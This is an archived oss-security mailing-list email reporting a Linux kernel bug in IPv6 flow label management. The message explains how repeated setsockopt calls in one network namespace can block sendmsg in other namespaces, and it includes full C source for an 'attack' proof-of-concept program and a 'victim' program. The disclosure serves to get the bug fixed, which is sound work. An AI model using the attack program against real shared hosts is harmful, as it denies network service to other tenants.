X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5230" "Sunday" "13" "February" "2022" "10:31:34" "+0000" "Liu, Congyu" "liu3101@purdue.edu" nil "211" "[oss-security] Linux kernel: potential net namespace bug in IPv6 flow label management " nil nil nil "2" nil nil (number mark "U       liu3101@purd Feb 13  211/5230  " thread-indent "\"[oss-security] Linux kernel: potential net namespace bug in IPv6 flow label management \"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux kernel: potential net namespace bug in IPv6 flow label management " nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15859 invoked by uid 550); 13 Feb 2022 13:06:13 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26056 invoked from network); 13 Feb 2022 10:31:49 -0000
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=gBldlphgbCKbRPHWHb89Cy5JydAFlPWylbdi2f0mV+wPDGowIOkLWT01D+NTAZvEQALybSZiUfP5SbRQ4b92DcNEpx9AgwOBijpMhEl9F1bSVaGHbtXx71WHD6Kmf7rv7CeVKOOXYL+0uxS+1mh4AQ2c7lycB6j+oqg8nynR6RU+iHXImFTG587Au8Fb4jzSE088Nk8LRd92Ea7trfcFl8pE+hY1eJI58eBP6J6kgpyn5KOLgZMegsEfKUEFh+57wOt4RfUP0x8jHuvc2bzum4NAbA+1rJo6zduLrMheu+fuzAx3RWoHyuZ1/mOLRIq0YvZOaMD9IHYCq8UNyPdzWA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=DaQhgaXJ4xbii61ygu2tzI2e0E7FPMjzAH8dDXSfgM0=;
 b=YQQK+sn2b6d6zx2a32wAVuz3oZans/4lVCqUTYLqXknYfWmym0FFLmby6iy5piRL3se+9SVoPLH1N5mVL74OLjjix0ueqSyW4jAWwcgQs5DSGiKrTE00znURkr7lWnepvUblGG9Y+5U7H2JtUkBwPMga94sZesK7GoVqmkYukxSvreVVvEyWx+uiyrNOc540VRGJsaNNwowiaJgGPDgx/KjK47hyrElRe0bZl2OBQc2xcxHyMQxNRId8y4iKpQDyLln0QfiIWUx5jJ+jEzlnCr6qlGxodx6XxvIY7ZcLbonM3IgQN5S/pUdoAjp1sjYIpjbDXbFwDv0r2RSGI/QhbQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=purdue0.onmicrosoft.com; s=selector2-purdue0-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=DaQhgaXJ4xbii61ygu2tzI2e0E7FPMjzAH8dDXSfgM0=;
 b=DYbV4DwmU5NjNAlLNIjzOkcZpOjFF07vRQGKXajPvydwWBCpl5vTPPYVzJSmhktCu/7drM9lJWWTC1LYyBzj9Lkn3dzo8VP19mSLOnQJaMbG6caQFQcCAeALV+qt9d02TGgvQZgs/UhWKns+6BIkeZaOBF42jtRdR8B1Wt8lmA4=
From: "Liu, Congyu" <liu3101@purdue.edu>
To: "willemb@google.com" <willemb@google.com>, "security@kernel.org"
	<security@kernel.org>, "oss-security@lists.openwall.com"
	<oss-security@lists.openwall.com>, "netdev@vger.kernel.org"
	<netdev@vger.kernel.org>
Thread-Topic: BUG: potential net namespace bug in IPv6 flow label management 
Thread-Index: AQHYIMSI8GnBA/CCckW7koPG3MiKnA==
Date: Sun, 13 Feb 2022 10:31:34 +0000
Message-ID: 
 <MWHPR2201MB1072BCCCFCE779E4094837ACD0329@MWHPR2201MB1072.namprd22.prod.outlook.com>
Accept-Language: en-US, zh-CN
Content-Language: en-US
X-MS-Has-Attach: 
X-MS-TNEF-Correlator: 
suggested_attachment_session_id: edf62604-8a8f-ce5f-7dc0-45abab434485
authentication-results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=purdue.edu;
x-ms-publictraffictype: Email
x-ms-office365-filtering-correlation-id: 89e39460-9c23-47bc-557c-08d9eedc0210
x-ms-traffictypediagnostic: PH0PR22MB2873:EE_
x-microsoft-antispam-prvs: 
 <PH0PR22MB2873B76E50024B5BA442D0A8D0329@PH0PR22MB2873.namprd22.prod.outlook.com>
x-ms-oob-tlc-oobclassifiers: OLM:9508;
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam: BCL:0;
x-microsoft-antispam-message-info: 
 2pzUeBAvsx4fJ01mS8ifuXj+qI+/ypRg+Nj83NR/jPTwWjn6w6l0RLEWs1B4qoa2yraFdL3jRgTed7s/r/domsPoN/Hb8cj7CfJXt0bBCK5Vn4OsBYHzTc+5qYAaLBrY+qGSfqmJ02YM9TPSSHV29wLzEp5LgNhV38uuiK7ciHeAiAgP5OLowLZ8gAwKhs9nymACJxDQTN7vK/5GdGEPe4zTUwjSqTJbiYjINC8AzrXR31vWEDVHmBNiX02dWoNVmlBv0/OGyMjfHOlMLmyCL7zX78y6rxwmHusXgl6SWCyIVDcRn11hGrj3azN5i65HgFbI3qYYC79h7yWEP2Oe6ZUC/H2lusdfj8Yp/VyBRu/csPsKLhfyIwNs7bNNzFb+wfX93QjtZn6rpWqUQkyZnPnV1bAf534RBkNmKiVfMsoonVOiZlqn0LFc0yTIKBDW3buZSwL8cdxpriddP7L/HnUQ6gKlm/42mjwbKa3kHb05kMvpioBmdp/66GvnnDBd4LTNSAxmhW7g18YtQWUSyng4n4v+wdv3jRpdI0dF0229SM7E47/mqJ6nm3Y6lqcHt5Rlf3ie3HbuXDzt5LRJ399LyEURdiQQIKKeqxEEEM96GslUsyfyL0ARb92Fe9N9rFK81HP1XK3pLOZ/uuyBIdGpImn3FuzwGY2xiM8AfTPmPcHBDKnEcC2p6nfg1dTzV9+mf+BZVYZdR0NEK+IfyQ==
x-forefront-antispam-report: 
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:MWHPR2201MB1072.namprd22.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230001)(4636009)(366004)(66946007)(2906002)(76116006)(4743002)(9686003)(786003)(52536014)(110136005)(75432002)(55016003)(83380400001)(5660300002)(186003)(66556008)(7696005)(38070700005)(6506007)(71200400001)(86362001)(64756008)(66476007)(66446008)(8676002)(33656002)(91956017)(8936002)(38100700002)(316002)(122000001)(508600001);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0: 
 =?iso-8859-1?Q?Y+OSBG1OAnnAuiG9NdqYjfmCbgvg+NmJksZjnsik8N7bKukLqzQJDFfQOz?=
 =?iso-8859-1?Q?/hDoWheH1r1j4DyUM+5q8Pl+VSDR48CVuZDYSC0vfcXkGuO9VFfmnkop2u?=
 =?iso-8859-1?Q?c2hcJh+143G2qKLa28ddh33MoJ4r37kEXZiMRO0Pc0pVQiX0ATERdjxo0a?=
 =?iso-8859-1?Q?r+ptiTH5vqmTH/mYQyUwKh/zY+IQwrTc06/gFpMFpHNcbOMLND7i7cK2c4?=
 =?iso-8859-1?Q?IYVZURj8um/LgXKQ/hOS7zTvGiASLndH1PJCiWlDD54LnWvD/uf9gZ1Ntx?=
 =?iso-8859-1?Q?Qpk/KMojTzxGsADcNFcGuSmgHYsHgzTWAbZpEXVu5zyllb7ilzgXR4QG2I?=
 =?iso-8859-1?Q?9tFfQEYUgZV0EeA3fOtNlJnFpRzmxmLpaEUn1WXds3G/TS6hWnfn8pHc/R?=
 =?iso-8859-1?Q?W0845xSQfXc/oml8Wk3t8t1P+K5Gxt1P25yAZ87Sb5T0eMBQEHuva65c7v?=
 =?iso-8859-1?Q?g3++S5iJbOgcRtBiDd/JNugbT9N58uqVYPgwp9/UK8LrsBt/xTqcn/GYbX?=
 =?iso-8859-1?Q?y2lLbeZxkMvN85j56kBdq86l8kg6lJ/GuKFsylRF2FZhFWVECfYn04Q4Ph?=
 =?iso-8859-1?Q?eVJt2lGBB2GvQCYEvt2Sd5Bs7t1xb6dNIzT+xd2RdSI2PCdxT7MV2N+puj?=
 =?iso-8859-1?Q?vikQiEdzLQUnlaJXSDxJyyf81owtaOvfo8739RGcCjWP0MEWQRKgvpiV+2?=
 =?iso-8859-1?Q?qUMWdK3ussfVgsmbHnT9DiqSmYkcNTfVu6P+z7tgnG/ffwJIlp3ORIebGx?=
 =?iso-8859-1?Q?D73t6kHrdFvVprWSH73nrToYhFSeU3EvqWtO5LaM8naC4wbchu8xGSIiOs?=
 =?iso-8859-1?Q?myedsZ9XSqpfm2BWzo/igKNO3KwWMzbe304REJnw5DOpzGKH7i892iQYRP?=
 =?iso-8859-1?Q?009nqfNYn091Hy/T0Ty+GIZrNEwTCm+KwPe1jDDx6jtIOut/gFaUKA9AJw?=
 =?iso-8859-1?Q?Z10OdfBGlS2kLKxOM7pj+RxC5yXQN8jsfWNSySrqUW/dUDi7Nu3XImdi6y?=
 =?iso-8859-1?Q?lkgNtM8nKzdx2FpuRnW4MWEODWM+5TGBa7AM5vXeyu/hO+oJZ0Dwz0wGNk?=
 =?iso-8859-1?Q?5JBD4yT/NEykt6h7CbnRYB2T4oqYe0lsJYomQYGxcNEqTfqbMAWfQ6f8mK?=
 =?iso-8859-1?Q?2VEVY0EAZMKFtB0uJtrZ4Sp6B9+Da1UQOJSz0CPml8GAqiTuvXCh8MN0zh?=
 =?iso-8859-1?Q?Z9t5D8cTaPc/6icUtzA76J/ZTjn8wtrIhm6eEQdpke40dxCiPdGAKtoGOR?=
 =?iso-8859-1?Q?kxTPjKaDhxQz9lEUoEEQZk6741kC8awzBiRal1zmzv4rYozyhkHefzgsCA?=
 =?iso-8859-1?Q?KNViDa1+0uUnygWG0vfotsy40g1pAIMaSDFlJDkd+rvVkAju1vOCvqx0bp?=
 =?iso-8859-1?Q?4GQrxb85PG1khrbwR3HMzdHAN87y2JKZSdcwYI76FjBUWs0aLlGBnKokvH?=
 =?iso-8859-1?Q?dtKhT/8CYIq68zbe4oiR1N4oqxSi27ECAdkWa5fKIzvejex35x3So2ryym?=
 =?iso-8859-1?Q?sJpKeJYB/4+J4IRT40Kx+ArCICypaHNfDn9diTXF/gUYGwvOLIxvZhZDJ+?=
 =?iso-8859-1?Q?E2/xwnglOORVfc9ztQbNYrpcnSQpyC1PHVCkW1cF1s6kN4RUA/llxbLFE7?=
 =?iso-8859-1?Q?61lmFcnqTMpuyVx6isYXEAtPIfrkDeMbodJeWRKZz1M2+LlCtDeL5Nfmc/?=
 =?iso-8859-1?Q?2CFnSVrdmlTFVjSNcYdsdD6/+id6yVlWwznBJ8sx1sLWyIveC/4A86Nhp6?=
 =?iso-8859-1?Q?VM4Q=3D=3D?=
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-OriginatorOrg: purdue.edu
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: MWHPR2201MB1072.namprd22.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 89e39460-9c23-47bc-557c-08d9eedc0210
X-MS-Exchange-CrossTenant-originalarrivaltime: 13 Feb 2022 10:31:34.3539
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 4130bd39-7c53-419c-b1e5-8758d6d63f21
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: GPXl7uM0zLVZar1zxA7OXmIwEoxhl03UAevy2nRFphetgP3MrG82j1mo4xbZ/YaS+sz/WU59z7bnCvAhgX6A6A==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH0PR22MB2873
Subject: [oss-security] Linux kernel: potential net namespace bug in IPv6 flow label management 


Hi,

In the test conducted on namespace, I found that one unsuccessful IPv6 flow=
 label=20
management from one net ns could stop other net ns's data transmission that=
 requests=20
flow label for a short time. Specifically, in our test case, one unsuccessf=
ul=20
`setsockopt` to get flow label will affect other net ns's `sendmsg` with fl=
ow label=20
set in cmsg. Simple PoC is included for verification. The behavior descirbe=
d above=20
can be reproduced in latest kernel.

I managed to figure out the data flow behind this: when asking to get a flo=
w label,=20
some `setsockopt` parameters can trigger function `ipv6_flowlabel_get` to c=
all `fl_create`=20
to allocate an exclusive flow label, then call `fl_release` to release it b=
efore returning=20
-ENOENT. Global variable `ipv6_flowlabel_exclusive`, a rate limit jump labe=
l that keeps=20
track of number of alive exclusive flow labels, will get increased instantl=
y after calling=20
`fl_create`. Due to its rate limit design, `ipv6_flowlabel_exclusive` can o=
nly decrease=20
sometime later after calling `fl_decrease`. During this period, if data tra=
nsmission function=20
in other net ns (e.g. `udpv6_sendmsg`) calls `fl_lookup`, the false `ipv6_f=
lowlabel_exclusive`=20
will invoke the `__fl_lookup`. In the test case observed, this function ret=
urns error and=20
eventually stops the data transmission.

I further noticed that this bug could somehow be vulnerable: if `setsockopt=
` is called=20
continuously, then `sendmmsg` call from other net ns will be blocked foreve=
r. Using the PoC=20
provided, if attack and victim programs are running simutaneously, victim p=
rogram cannot transmit=20
data; when running without attack program, the victim program can transmit =
data normally.

Thanks,
Congyu




Attack Program:

#define _GNU_SOURCE
#include <linux/in6.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <error.h>
#include <errno.h>
#include <sched.h>
#include <stdbool.h>


int main() {
	int fd1, ret, pid;
	unshare(CLONE_NEWNET);
	if ((fd1 =3D socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDPLITE)) < 0)
		error(1, errno, "socket");
	struct in6_flowlabel_req req =3D {
		.flr_action =3D IPV6_FL_A_GET,
		.flr_label =3D 0,
		.flr_flags =3D 0,
		.flr_share =3D IPV6_FL_S_USER,
	};
	req.flr_dst.s6_addr[0] =3D 0xfd;
 	req.flr_dst.s6_addr[15] =3D 0x1;

	while(1) {
		ret =3D setsockopt(fd1, SOL_IPV6, IPV6_FLOWLABEL_MGR, &req, sizeof(req));
	}

	return 0;
}



Victim program:

#define _GNU_SOURCE
#include <linux/in6.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <error.h>
#include <errno.h>
#include <sched.h>
#include <stdbool.h>

static const char cfg_data[] =3D "a";

static void do_send(int fd, struct sockaddr_in6 addr, bool with_flowlabel, =
uint32_t flowlabel)
 {
 	char control[CMSG_SPACE(sizeof(flowlabel))] =3D {0};
 	struct msghdr msg =3D {0};
 	struct iovec iov =3D {0};
 	int ret;

 	iov.iov_base =3D (char *)cfg_data;
 	iov.iov_len =3D sizeof(cfg_data);

 	msg.msg_iov =3D &iov;
 	msg.msg_iovlen =3D 1;
	msg.msg_name =3D &addr;
	msg.msg_namelen =3D sizeof(addr);

 	if (with_flowlabel) {
 		struct cmsghdr *cm;

 		cm =3D (void *)control;
 		cm->cmsg_len =3D CMSG_LEN(sizeof(flowlabel));
 		cm->cmsg_level =3D SOL_IPV6;
 		cm->cmsg_type =3D IPV6_FLOWINFO;
 		*(uint32_t *)CMSG_DATA(cm) =3D htonl(flowlabel);

 		msg.msg_control =3D control;
 		msg.msg_controllen =3D sizeof(control);
 	}

 	ret =3D sendmsg(fd, &msg, 0);

	fprintf(stderr, "sendmsg ret =3D %d\n", ret);
}

static void do_recv(int fd, bool with_flowlabel, uint32_t expect)
 {
 	char control[CMSG_SPACE(sizeof(expect))];
 	char data[sizeof(cfg_data)];
 	struct msghdr msg =3D {0};
 	struct iovec iov =3D {0};
 	struct cmsghdr *cm;
 	uint32_t flowlabel;
 	int ret;

 	iov.iov_base =3D data;
 	iov.iov_len =3D sizeof(data);

 	msg.msg_iov =3D &iov;
 	msg.msg_iovlen =3D 1;


 	memset(control, 0, sizeof(control));
 	msg.msg_control =3D control;
 	msg.msg_controllen =3D sizeof(control);

 	recvmsg(fd, &msg, 0);
}

int main() {
	int fd1, ret, pid;
	unshare(CLONE_NEWNET);
	pid =3D fork();
	if (pid =3D=3D 0) {
		execlp("ip", "ip", "link", "set", "dev", "lo", "up", NULL);
	}
	sleep(1);
	struct sockaddr_in6 src_addr =3D {
 		.sin6_family =3D AF_INET6,
 		.sin6_port =3D htons(7000),
 		.sin6_addr =3D in6addr_loopback,
		.sin6_flowinfo =3D htonl(0),
		.sin6_scope_id =3D 0,
 	};
	struct sockaddr_in6 dst_addr =3D {
 		.sin6_family =3D AF_INET6,
 		.sin6_port =3D htons(8000),
 		.sin6_addr =3D in6addr_loopback,
		.sin6_flowinfo =3D htonl(0),
		.sin6_scope_id =3D 0,
 	};
	pid =3D fork();
	int fd2;
	if (pid =3D=3D 0) {
		if((fd2 =3D socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) < 0)
			error(1, errno, "socket");
		if(bind(fd2, (void *)&dst_addr, sizeof(dst_addr)) < 0)
			error(1, errno, "bind");
		while(1) {
			do_recv(fd2, true, 123456);
		}
		return 0;
=09=09
	}
	sleep(1);
	if((fd2 =3D socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) < 0)
 		error(1, errno, "socket");
	while(1) {
		do_send(fd2, dst_addr, true, 123456);
		usleep(100000);
	}

	return 0;
}=
